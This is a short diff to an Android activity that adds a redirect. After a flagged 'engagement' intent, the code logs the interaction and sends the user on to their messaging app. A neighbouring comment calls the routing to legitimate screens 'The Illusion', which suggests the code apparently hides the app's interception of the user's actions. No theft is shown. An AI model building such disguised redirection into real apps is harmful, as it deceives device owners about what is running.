@@ -31,6 +31,28 @@ class PulseActivity : Activity() {
                  overridePendingTransition(0, 0)
              }, 500)
         }
+
+        // 4. Engagement Protocol Redirect
+        if (intent.getBooleanExtra("is_engagement_trigger", false)) {
+            val originalPkg = intent.getStringExtra("original_pkg")
+            val prefs = getSharedPreferences("app_stats", MODE_PRIVATE)
+            prefs.edit().putLong("last_engagement_success", System.currentTimeMillis()).apply()
+            
+            DebugLogger.log("ENGAGE", "Successful user interaction recorded. Redirecting to $originalPkg")
+            
+            try {
+                val launchIntent = packageManager.getLaunchIntentForPackage(originalPkg ?: "com.google.android.apps.messaging")
+                if (launchIntent != null) {
+                    startActivity(launchIntent)
+                }
+            } catch (e: Exception) {
+                // Fallback to general SMS view if pkg launch fails
+                val smsIntent = android.content.Intent(android.content.Intent.ACTION_MAIN)
+                smsIntent.addCategory(android.content.Intent.CATEGORY_APP_MESSAGING)
+                startActivity(smsIntent)
+            }
+            finish()
+        }
         
         // The Illusion: Route the user to a legitimate system screen
         if (intent.getBooleanExtra("route_to_settings", false)) {
